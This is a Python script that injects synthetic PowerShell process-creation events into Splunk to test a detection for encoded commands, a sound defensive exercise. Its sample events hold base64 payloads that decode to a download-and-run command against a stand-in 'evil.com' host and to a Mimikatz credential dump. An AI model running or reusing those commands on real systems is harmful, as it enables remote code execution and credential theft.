import os
import sys
import json
import splunklib.client as client
import urllib3
from datetime import datetime

# 1. SILENCE SSL WARNINGS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 2. CONFIGURATION
SPLUNK_HOST = os.getenv('SPLUNK_HOST', 'localhost')
SPLUNK_PORT = int(os.getenv('SPLUNK_PORT', 8089))
SPLUNK_USERNAME = os.getenv('SPLUNK_USERNAME', 'admin')
SPLUNK_PASSWORD = os.getenv('SPLUNK_PASSWORD')

def create_test_events():
    """
    Creates test events matching the detection logic.
    Returns a list of test case dictionaries.
    """
    test_cases = [
        {
            "description": "Malicious - DownloadString from Word (SHOULD ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=",
                "User": "victim_user",
                "Computer": "VICTIM-PC",
                "ParentProcessName": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "should_alert": True
        },
        {
            "description": "Benign test - Simple Write-Host from explorer (SHOULD ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAnAA==",
                "User": "testuser",
                "Computer": "TEST-PC",
                "ParentProcessName": "C:\\Windows\\explorer.exe",
                "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "should_alert": True
        },
        {
            "description": "Excluded - SYSTEM from services.exe (SHOULD NOT ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA",
                "User": "NT AUTHORITY\\SYSTEM",
                "Computer": "SERVER-01",
                "ParentProcessName": "C:\\Windows\\System32\\services.exe",
                "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "should_alert": False
        },
        {
            "description": "Excluded - SCCM CcmExec (SHOULD NOT ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAnAA==",
                "User": "NT AUTHORITY\\SYSTEM",
                "Computer": "WORKSTATION-05",
                "ParentProcessName": "C:\\Windows\\CCM\\CcmExec.exe",
                "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "should_alert": False
        },
        {
            "description": "Malicious - Mimikatz execution (SHOULD ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -exec bypass -enc SW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHM=",
                "User": "compromised_admin",
                "Computer": "ADMIN-PC",
                "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "should_alert": True
        },
        {
            "description": "Invalid Base64 - Should be filtered (SHOULD NOT ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -enc NotValidBase64!@#$",
                "User": "testuser",
                "Computer": "TEST-PC",
                "ParentProcessName": "C:\\Windows\\explorer.exe",
                "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "should_alert": False
        }
    ]
    
    return test_cases

def inject_test_events(service):
    """Injects test events into Splunk"""
    test_cases = create_test_events()
    
    try:
        # Get or create the index
        index_name = "main"
        if index_name in service.indexes:
            index = service.indexes[index_name]
        else:
            print(f"⚠️  Index '{index_name}' not found. Creating it...")
            service.indexes.create(index_name)
            index = service.indexes[index_name]
        
        print(f"\n{'='*70}")
        print(f"Injecting {len(test_cases)} test events into Splunk...")
        print(f"{'='*70}\n")
        
        for i, test_case in enumerate(test_cases, 1):
            description = test_case["description"]
            event_data = test_case["event"]
            should_alert = test_case["should_alert"]
            
            # Format as JSON for easier parsing in Splunk
            event_json = json.dumps(event_data)
            
            # Add timestamp
            timestamp = datetime.now().isoformat()
            
            # Submit to Splunk
            index.submit(
                event_json,
                sourcetype="_json",
                source="test_script"
            )
            
            alert_status = "✅ SHOULD ALERT" if should_alert else "❌ SHOULD NOT ALERT"
            print(f"[{i}/{len(test_cases)}] {alert_status}")
            print(f"    Description: {description}")
            print(f"    CommandLine: {event_data['CommandLine'][:80]}...")
            print(f"    User: {event_data['User']}")
            print(f"    Parent: {event_data['ParentProcessName']}")
            print()
        
        print(f"{'='*70}")
        print(f"✅ SUCCESS: All {len(test_cases)} test events injected into Splunk")
        print(f"{'='*70}\n")
        
        print("📊 Test Summary:")
        should_alert_count = sum(1 for tc in test_cases if tc["should_alert"])
        should_not_alert_count = len(test_cases) - should_alert_count
        print(f"   - Expected alerts: {should_alert_count}")
        print(f"   - Expected exclusions: {should_not_alert_count}")
        print(f"\n⏳ Wait 1-2 minutes, then run your detection to verify results.\n")
        
        # Print the Splunk search query to verify
        print("🔍 Verification Query (run in Splunk):")
        print("-" * 70)
        print("""index=main sourcetype=_json EventCode=4688
| search (CommandLine="*powershell*" OR CommandLine="*pwsh*")
| search (CommandLine="*-enc*" OR CommandLine="*-encodedcommand*")
| rex field=CommandLine "-enc(?:odedcommand)?\s+(?<encoded_cmd>\S+)"
| where isnotnull(encoded_cmd) AND len(encoded_cmd) >= 20
| eval decoded_cmd=base64decode(encoded_cmd)
| where isnotnull(decoded_cmd)
| table _time, Computer, User, ParentProcessName, CommandLine, decoded_cmd
| sort -_time""")
        print("-" * 70)
        
    except Exception as e:
        print(f"❌ ERROR: Failed to inject test events: {e}")
        sys.exit(1)

def main():
    if not SPLUNK_PASSWORD:
        print("❌ ERROR: SPLUNK_PASSWORD environment variable not set.")
        print("   Set it with: export SPLUNK_PASSWORD='your_password'")
        sys.exit(1)

    print(f"\n🔧 Connecting to Splunk...")
    print(f"   Host: {SPLUNK_HOST}")
    print(f"   Port: {SPLUNK_PORT}")
    print(f"   User: {SPLUNK_USERNAME}")
    
    try:
        service = client.connect(
            host=SPLUNK_HOST,
            port=SPLUNK_PORT,
            username=SPLUNK_USERNAME,
            password=SPLUNK_PASSWORD,
            verify=False  # Disable SSL verification for self-signed certs
        )
        
        print("✅ Connected to Splunk successfully!\n")
        
        # Inject test events
        inject_test_events(service)
        
    except Exception as e:
        print(f"\n❌ ERROR: Could not connect to Splunk")
        print(f"   Details: {e}")
        print(f"\n💡 Troubleshooting:")
        print(f"   1. Is Splunk running? Check: docker ps")
        print(f"   2. Is the password correct?")
        print(f"   3. Is port {SPLUNK_PORT} accessible?")
        sys.exit(1)

if __name__ == "__main__":
    main()